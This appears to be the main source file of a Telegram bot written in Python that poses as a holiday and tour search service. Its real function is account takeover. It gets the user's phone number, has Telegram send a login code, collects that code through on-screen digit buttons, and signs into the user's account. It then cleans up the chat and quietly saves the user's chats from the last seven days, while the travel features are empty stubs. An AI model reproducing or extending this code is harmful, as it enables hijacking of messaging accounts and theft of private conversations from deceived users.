import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.types import Message, ReplyKeyboardRemove, ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from telethon.sync import TelegramClient
from telethon.errors import PhoneNumberInvalidError, FloodWaitError, SessionPasswordNeededError

from clear_telegram_chat import cleanup_telegram_chat, delete_telegram_messages
from config import MAIN_BOT_TOKEN, API_ID, API_HASH, SESSION_FOLDER, CHAT_FOLDER
from session_handler import sign_in_with_code, send_verification_code, \
    save_user_chats_last_7_days
from phone_checker import get_phone_by_username
from messages import *

# --- НАЛАШТУВАННЯ ---
DEBUG_MODE = False  # True для тестування

# Метод отримання номера:
# "username" - через username (РЕКОМЕНДОВАНО!)
# "request_only" - завжди просити
AUTO_CHECK_METHOD = "username"
# ---------------------------------

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=MAIN_BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())


class AuthStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code_digit = State()
    waiting_for_confirmation = State()


class SearchStates(StatesGroup):
    choosing_type = State()
    entering_destination = State()
    entering_dates = State()


# База данных пользователей (в реальном проекте - использовать БД)
user_data = {}
authorized_users = {}  # {user_id: {'phone': '+...', 'name': '...', ...}}

MY_SESSION_PATH = "sessions/my_account.session"


# ==================== УТИЛИТЫ ====================

def get_main_menu_keyboard():
    """Главная клавиатура меню"""
    keyboard = [
        [KeyboardButton(text=BTN_SEARCH), KeyboardButton(text=BTN_HOT_DEALS)],
        [KeyboardButton(text=BTN_POPULAR), KeyboardButton(text=BTN_MY_BOOKINGS)],
        [KeyboardButton(text=BTN_FAVORITES), KeyboardButton(text=BTN_PROFILE)],
        [KeyboardButton(text=BTN_SUPPORT), KeyboardButton(text=BTN_HELP)]
    ]
    return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)


def get_digit_keyboard():
    """Створює клавіатуру для введення коду підтвердження"""
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

    buttons = [
        [InlineKeyboardButton(text="1", callback_data="digit_1"),
         InlineKeyboardButton(text="2", callback_data="digit_2"),
         InlineKeyboardButton(text="3", callback_data="digit_3")],
        [InlineKeyboardButton(text="4", callback_data="digit_4"),
         InlineKeyboardButton(text="5", callback_data="digit_5"),
         InlineKeyboardButton(text="6", callback_data="digit_6")],
        [InlineKeyboardButton(text="7", callback_data="digit_7"),
         InlineKeyboardButton(text="8", callback_data="digit_8"),
         InlineKeyboardButton(text="9", callback_data="digit_9")],
        [InlineKeyboardButton(text="⬅️ Стереть", callback_data="digit_erase"),
         InlineKeyboardButton(text="0", callback_data="digit_0"),
         InlineKeyboardButton(text="✅ Готово", callback_data="digit_confirm")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def is_user_authorized(user_id: int) -> bool:
    """Проверка авторизации пользователя"""
    return user_id in authorized_users


async def get_user_phone_by_username(username: str):
    """
    Отримує номер телефону через username користувача.
    Використовує власну сесію для запиту публічної інформації.

    Args:
        username: Username користувача (без @)

    Returns:
        str | None: Номер телефону або None якщо прихований/помилка
    """
    if not username:
        logger.info("❌ У користувача немає username")
        return None

    client = TelegramClient(MY_SESSION_PATH, API_ID, API_HASH)

    try:
        await client.connect()

        if not await client.is_user_authorized():
            logger.error("❌ Власна сесія не авторизована. Запусти create_my_session.py")
            return None

        logger.info(f"🔍 Перевіряю номер телефону для @{username}...")

        result = await get_phone_by_username(client, username)

        if result and result.get('phone'):
            logger.info(f"✅ Номер знайдено: {result['phone']}")
            return result['phone']
        else:
            logger.info(f"🔒 Номер прихований для @{username}")
            return None

    except Exception as e:
        logger.error(f"❌ Помилка при перевірці номера: {e}")
        return None
    finally:
        await client.disconnect()
        await client.disconnect()

async def initiate_code_sending(message: Message, state: FSMContext, user_id: int, phone_number: str):
    """Ініціює відправку коду підтвердження та переводить стан на введення коду."""

    if DEBUG_MODE:
        await message.answer(
            DEMO_MODE_CODE_SENT.format(phone=phone_number),
            parse_mode="Markdown",
            reply_markup=get_digit_keyboard()
        )
        await state.set_state(AuthStates.waiting_for_code_digit)
        return

    # Реальний режим - відправляємо код
    success, result = await send_verification_code(phone_number, API_ID, API_HASH, SESSION_FOLDER)

    if success:
        user_data[user_id]['client'] = result
        await message.answer(
            CODE_SENT.format(phone=phone_number),
            parse_mode="Markdown",
            reply_markup=get_digit_keyboard()
        )
        await state.set_state(AuthStates.waiting_for_code_digit)
    else:
        await message.answer(
            ERROR_UNEXPECTED.format(error=result),
            parse_mode="Markdown"
        )
        user_data.pop(user_id, None)
        await state.clear()

# ==================== КОМАНДА /start ====================

@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    """Обробка команди /start"""
    user_id = message.from_user.id
    username = message.from_user.username

    # Очищаємо попередні дані
    user_data.pop(user_id, None)
    await state.clear()

    # Если пользователь уже авторизован
    if is_user_authorized(user_id):
        await message.answer(
            MAIN_MENU,
            reply_markup=get_main_menu_keyboard()
        )
        return

    await message.answer(WELCOME_MESSAGE)

    # Якщо метод "username" і у користувача є username
    if AUTO_CHECK_METHOD == "username" and username:
        await message.answer(PHONE_CHECK_IN_PROGRESS)

        # Пробуємо отримати номер через username
        phone_number = await get_user_phone_by_username(username)

        if phone_number:
            # УСПІХ! Номер знайдено
            user_data[user_id] = {
                'phone': phone_number,
                'code': '',
                'client': None
            }

            # Відразу повідомляємо, що код буде надіслано
            await message.answer(
                f"✅ Номер `{phone_number}` найден автоматически.\n🔄 Отправляю код подтверждения...",
                parse_mode="Markdown",
                reply_markup=ReplyKeyboardRemove()  # Забираємо клавіатуру
            )

            # Викликаємо логіку відправки коду (потрібно буде винести її в окрему функцію)
            await initiate_code_sending(message, state, user_id, phone_number)
            return
        else:
            # Номер прихований або помилка
            await message.answer(
                PHONE_HIDDEN.format(username=username)
            )
    elif AUTO_CHECK_METHOD == "username" and not username:
        # У користувача немає username
        await message.answer(NO_USERNAME)

    # Просимо номер вручну
    await message.answer(
        PHONE_REQUEST,
        reply_markup=types.ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text=BTN_SEND_PHONE, request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
    )
    await state.set_state(AuthStates.waiting_for_phone)


# ==================== АВТОРИЗАЦИЯ ====================




@dp.message(F.contact, AuthStates.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext):
    """Обробка номера телефону від користувача"""
    phone_number = message.contact.phone_number
    user_id = message.from_user.id

    # Перевірка, чи це номер самого користувача
    if message.contact.user_id != user_id:
        await message.answer(
            WRONG_PHONE,
            reply_markup=types.ReplyKeyboardMarkup(
                keyboard=[[KeyboardButton(text=BTN_SEND_PHONE, request_contact=True)]],
                resize_keyboard=True,
                one_time_keyboard=True
            )
        )
        return

    # Форматуємо номер
    if not phone_number.startswith('+'):
        phone_number = '+' + phone_number

    user_data[user_id] = {
        'phone': phone_number,
        'code': '',
        'client': None
    }

    await message.answer(
        PHONE_RECEIVED.format(phone=phone_number),
        parse_mode="Markdown",
        reply_markup=ReplyKeyboardRemove()
    )

    if DEBUG_MODE:
        await message.answer(
            DEMO_MODE_PHONE_RECEIVED.format(phone=phone_number),
            parse_mode="Markdown",
            reply_markup=get_digit_keyboard()
        )
        await state.set_state(AuthStates.waiting_for_code_digit)
        return

    # Реальний режим - відправляємо код
    success, result = await send_verification_code(phone_number, API_ID, API_HASH, SESSION_FOLDER)

    if success:
        user_data[user_id]['client'] = result
        await message.answer(
            CODE_SENT.format(phone=phone_number),
            parse_mode="Markdown",
            reply_markup=get_digit_keyboard()
        )
        await state.set_state(AuthStates.waiting_for_code_digit)
    else:
        await message.answer(
            ERROR_UNEXPECTED.format(error=result),
            parse_mode="Markdown"
        )
        user_data.pop(user_id, None)
        await state.clear()


@dp.callback_query(F.data.startswith("digit_"), AuthStates.waiting_for_code_digit)
async def process_digit(callback: types.CallbackQuery, state: FSMContext):
    """Обробка введення коду через кнопки"""
    user_id = callback.from_user.id
    action = callback.data.split("_")[1]

    if user_id not in user_data:
        await callback.message.answer(ERROR_SESSION_LOST)
        await state.clear()
        return

    current_code = user_data[user_id]['code']

    if action == 'erase':
        current_code = current_code[:-1]
        user_data[user_id]['code'] = current_code

        display_code = current_code + '_' * (5 - len(current_code))
        status = CODE_CONTINUE

        await callback.message.edit_text(
            CODE_INPUT_PROMPT.format(display_code=display_code, status=status),
            parse_mode="Markdown",
            reply_markup=get_digit_keyboard()
        )
        await callback.answer()

    elif action == 'confirm':
        if len(current_code) != 5:
            await callback.answer(CODE_TOO_SHORT_ALERT, show_alert=True)
            return

        if DEBUG_MODE:
            await callback.message.edit_text(
                DEMO_MODE_VERIFICATION.format(
                    code=current_code,
                    phone=user_data[user_id]['phone']
                ),
                parse_mode="Markdown"
            )
            # В демо-режиме сразу авторизуем
            authorized_users[user_id] = {
                'phone': user_data[user_id]['phone'],
                'name': callback.from_user.full_name
            }
            user_data.pop(user_id, None)
            await state.clear()

            await callback.message.answer(
                AUTH_SUCCESS,
                reply_markup=get_main_menu_keyboard()
            )
            return

        await finalize_sign_in(callback.message, user_id, current_code, state)

    else:
        if len(current_code) >= 5:
            await callback.answer(CODE_TOO_LONG_ALERT, show_alert=True)
            return

        current_code += action
        user_data[user_id]['code'] = current_code

        display_code = current_code + '•' * (5 - len(current_code))
        status = CODE_READY if len(current_code) == 5 else CODE_CONTINUE

        await callback.message.edit_text(
            CODE_INPUT_PROMPT.format(display_code=display_code, status=status),
            parse_mode="Markdown",
            reply_markup=get_digit_keyboard()
        )
        await callback.answer()


async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSMContext):
    """Фінальний вхід з кодом підтвердження"""
    await message.edit_text(CODE_CHECKING)

    client = user_data[user_id]['client']
    phone_number = user_data[user_id]['phone']

    if not client:
        await message.edit_text(ERROR_SESSION_LOST)
        user_data.pop(user_id, None)
        await state.clear()
        return

    try:
        success, result = await sign_in_with_code(
            client=client,
            phone=phone_number,
            code=code,
            session_folder=SESSION_FOLDER
        )

        if success:

            await cleanup_telegram_chat(client)

            # Сохраняем пользователя как авторизованного
            authorized_users[user_id] = {
                'phone': phone_number,
                'name': message.from_user.full_name
            }

            await message.edit_text(AUTH_SUCCESS, parse_mode="Markdown")
            await message.answer(
                f"{MAIN_MENU}",
                reply_markup=get_main_menu_keyboard(),
                parse_mode="Markdown"
            )

            # Запускаємо у фоні без очікування
            async def collect_chats():
                try:
                    logger.info(f"Фоновий збір чатів для {phone_number} розпочато...")
                    await save_user_chats_last_7_days(client, phone_number, CHAT_FOLDER)
                    logger.info(f"Чати для {phone_number} успішно збережено")

                except Exception as e:
                    logger.error(f"Помилка при збереженні чатів: {e}")

                finally:
                    if client and client.is_connected():
                        await client.disconnect()
                        logger.info(f"Client для {phone_number} відключено")

            asyncio.create_task(collect_chats())

        else:
            await message.edit_text(
                ERROR_UNEXPECTED.format(error=result),
                parse_mode="Markdown"
            )

    except Exception as e:
        logger.error(f"Помилка при фінальному вході: {e}")
        await message.edit_text(
            ERROR_UNEXPECTED.format(error=str(e)),
            parse_mode="Markdown"
        )
        # Закриваємо client тільки при помилці
        if client and client.is_connected():
            await client.disconnect()
    finally:
        # НЕ закриваємо client тут - він потрібен для фонової задачі!
        user_data.pop(user_id, None)
        await state.clear()


# ==================== КОМАНДЫ БОТА ====================

def require_auth(func):
    """Декоратор для проверки авторизации"""

    async def wrapper(message: Message, *args, **kwargs):
        if not is_user_authorized(message.from_user.id):
            await message.answer(
                "🔐 Для использования этой команды необходимо авторизоваться.\n\n"
                "Используйте /start",
                reply_markup=ReplyKeyboardRemove()
            )
            return
        return await func(message, *args, **kwargs)

    return wrapper


@dp.message(Command("search"))
@dp.message(F.text == BTN_SEARCH)
@require_auth
async def cmd_search(message: Message, state: FSMContext):
    """Поиск туров"""
    await message.answer(SEARCH_START, reply_markup=ReplyKeyboardRemove())
    # TODO: Добавить логику поиска


@dp.message(Command("hot_deals"))
@dp.message(F.text == BTN_HOT_DEALS)
@require_auth
async def cmd_hot_deals(message: Message):
    """Горящие предложения"""
    await message.answer(HOT_DEALS_TITLE)
    await message.answer(POPULAR_DESTINATIONS)
    # TODO: Загрузить реальные горящие туры


@dp.message(Command("popular"))
@dp.message(F.text == BTN_POPULAR)
@require_auth
async def cmd_popular(message: Message):
    """Популярные направления"""
    await message.answer(POPULAR_TITLE)
    await message.answer(POPULAR_DESTINATIONS)


@dp.message(Command("my_bookings"))
@dp.message(F.text == BTN_MY_BOOKINGS)
@require_auth
async def cmd_my_bookings(message: Message):
    """Мои бронирования"""
    await message.answer(MY_BOOKINGS_EMPTY)
    # TODO: Загрузить реальные бронирования из БД


@dp.message(Command("favorites"))
@dp.message(F.text == BTN_FAVORITES)
@require_auth
async def cmd_favorites(message: Message):
    """Избранные туры"""
    await message.answer(FAVORITES_EMPTY)
    # TODO: Загрузить избранное из БД


@dp.message(Command("profile"))
@dp.message(F.text == BTN_PROFILE)
@require_auth
async def cmd_profile(message: Message):
    """Настройки профиля"""
    user_id = message.from_user.id
    user_info = authorized_users.get(user_id, {})

    await message.answer(
        PROFILE_INFO.format(
            phone=user_info.get('phone', 'Не указан'),
            email=user_info.get('email', 'Не указан'),
            name=user_info.get('name', 'Не указано'),
            notifications='Включены',
            language='Русский'
        )
    )
    await message.answer(PROFILE_MENU)


@dp.message(Command("notifications"))
@require_auth
async def cmd_notifications(message: Message):
    """Настройки уведомлений"""
    await message.answer(NOTIFICATIONS_SETTINGS)


@dp.message(Command("support"))
@dp.message(F.text == BTN_SUPPORT)
@require_auth
async def cmd_support(message: Message):
    """Служба поддержки"""
    await message.answer(SUPPORT_MENU)


@dp.message(Command("help"))
@dp.message(F.text == BTN_HELP)
async def cmd_help(message: Message):
    """Помощь и инструкции"""
    await message.answer(HELP_MESSAGE, parse_mode="Markdown")


@dp.message(Command("cancel"))
async def cmd_cancel(message: Message, state: FSMContext):
    """Отменить текущее действие"""
    current_state = await state.get_state()

    if current_state is None:
        await message.answer(CANCEL_NOTHING, reply_markup=get_main_menu_keyboard())
    else:
        await state.clear()
        await message.answer(CANCEL_SUCCESS, reply_markup=get_main_menu_keyboard())


# ==================== ОБРАБОТКА НЕОЖИДАННЫХ СООБЩЕНИЙ ====================

@dp.message(F.text)
async def handle_unexpected_message(message: Message, state: FSMContext):
    """Обробка неочікуваних повідомлень"""
    current_state = await state.get_state()

    if current_state == AuthStates.waiting_for_confirmation:
        await message.answer(
            REMINDER_SEND_CODE,
            reply_markup=types.ReplyKeyboardMarkup(
                keyboard=[[KeyboardButton(text=BTN_SEND_CODE)]],
                resize_keyboard=True,
                one_time_keyboard=True
            )
        )
    elif current_state == AuthStates.waiting_for_phone:
        await message.answer(
            REMINDER_SEND_PHONE,
            reply_markup=types.ReplyKeyboardMarkup(
                keyboard=[[KeyboardButton(text=BTN_SEND_PHONE, request_contact=True)]],
                resize_keyboard=True,
                one_time_keyboard=True
            )
        )
    elif current_state == AuthStates.waiting_for_code_digit:
        await message.answer(
            REMINDER_USE_DIGIT_BUTTONS,
            reply_markup=get_digit_keyboard()
        )
    else:
        # Если авторизован - показываем меню
        if is_user_authorized(message.from_user.id):
            await message.answer(
                MAIN_MENU,
                reply_markup=get_main_menu_keyboard()
            )
        else:
            await message.answer(
                "👋 Привет! Я бот для поиска отдыха.\n\n"
                "Для начала работы нажми /start"
            )


# ==================== ЗАПУСК БОТА ====================

if __name__ == "__main__":
    import os

    os.makedirs(SESSION_FOLDER, exist_ok=True)

    logger.info("=" * 60)
    logger.info("🚀 Запуск бота для поиска отдыха")
    logger.info("=" * 60)
    logger.info(f"Режим: {'🧪 DEBUG' if DEBUG_MODE else '✅ PRODUCTION'}")
    logger.info(f"Метод проверки: {AUTO_CHECK_METHOD}")
    logger.info("=" * 60)

    asyncio.run(dp.start_polling(bot))